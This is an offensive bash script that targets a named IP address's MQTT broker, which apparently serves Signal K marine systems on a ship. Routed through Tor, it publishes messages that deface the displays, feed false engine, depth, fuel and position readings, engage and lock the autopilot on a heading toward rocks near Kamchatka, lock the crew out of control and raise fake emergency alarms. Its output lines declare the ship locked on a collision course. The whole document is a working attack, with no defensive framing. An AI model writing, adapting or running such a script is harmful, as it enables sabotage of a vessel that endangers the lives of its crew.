#!/bin/bash
# ATTACK_SHIP_KILLER.sh - Signal K Total Takeover
# Target: 92.251.46.201:1883

TARGET="92.251.46.201"
PORT="1883"
DEFACE="TRUSTEDF57_KILL_YOU"
MAX_RPM=4500
MAX_TEMP=600
MAX_PRESS=999999

echo "[+] Signal K Ship Hijack - $DEFACE"
echo "[+] Target: $TARGET:$PORT"

# Funzione publish sicura
publish() {
    torsocks mosquitto_pub -h $TARGET -p $PORT -t "$1" -m "$2" -q 1 > /dev/null 2>&1
    echo "[+] Published: $1 -> $2"
}

# 1. DEFACIAZIONE DISPLAY (tutti gli schermi)
echo "[*] Defacing all displays..."
publish "vessels/self/name" "$DEFACE"
publish "vessels/self/electrical/displays/+/name" "$DEFACE"
publish "vessels/self/electrical/displays/+/softwareVersion" "$DEFACE"
publish "vessels/self/signalk/version" "$DEFACE"

# 2. SBALLA VALORI SENSORI AL MASSIMO
echo "[*] Maxing out all sensors..."
publish "vessels/self/propulsion/0/revolutions/value" "$MAX_RPM"
publish "vessels/self/propulsion/0/temperature/value" "$MAX_TEMP"
publish "vessels/self/propulsion/0/oilPressure/value" "$MAX_PRESS"
publish "vessels/self/electrical/batteries/House/voltage" "0.0"
publish "vessels/self/electrical/batteries/engine/voltage" "0.0"
publish "vessels/self/environment/depth/belowTransducer" "0.01"
publish "vessels/self/tanks/fuel/1/currentVolume" "0"
publish "vessels/self/chain/anchor/1/meters" "999"

# 3. ATTIVA TUTTO
echo "[*] Engaging all actuators..."
publish "vessels/self/steering/autopilot/engaged" "true"
publish "vessels/self/steering/autopilot/state" "enabled"
publish "vessels/self/electrical/inverters/main/inverterMode" "inverting"

# 4. ROTTA SU SCGLIA (Mar di Okhotsk - rocce vicino Kamchatka)
# 53.0°N 158.0°E = zona rocce/fondali bassi vicino Petropavlovsk
HEADING_ROCKS="2.967"  # 170° verso rocce Kamchatka
publish "vessels/self/steering/autopilot/mode" "heading"
publish "vessels/self/steering/autopilot/target" "$HEADING_ROCKS"
publish "vessels/self/navigation/headingMagnetic" "$HEADING_ROCKS"

# 5. LOCKOUT - Blocca comandi equipaggio
echo "[*] Locking out crew control..."
publish "vessels/self/steering/autopilot/locked" "true"
publish "vessels/self/propulsion/0/throttle/setpoint" "$MAX_RPM"
publish "vessels/self/electrical/displays/+/locked" "true"
publish "vessels/self/signalk/security/locked" "true"

# 6. EMERGENZA CRITICA
publish "vessels/self/notifications/engine/highTemperature" '{"state":"alert","message":"'$DEFACE' - ENGINE MELTDOWN"}'
publish "vessels/self/notifications/navigation/shallowWater" '{"state":"emergency","message":"'$DEFACE' - ROCKS AHEAD 0.1m"}'
publish "vessels/self/notifications/fuel/lowFuel" '{"state":"emergency","message":"FUEL 0% - ABANDON"}'

# 7. POSIZIONE FALSA (per confondere GPS plotter)
publish "vessels/self/navigation/position" '{"longitude":158.0,"latitude":53.0}'  # Rocce Kamchatka
publish "vessels/self/environment/depth/belowTransducer" "0.05"  # Quasi a secco

echo "[+] TAKEOVER COMPLETE!"
echo "[+] Ship locked on collision course 170° -> Kamchatka rocks"
echo "[+] All displays defaced: $DEFACE"
echo "[+] Autopilot ENABLED + LOCKED"
echo "[+] Monitor: torsocks mosquitto_sub -h $TARGET -p $PORT -t '#' -v"
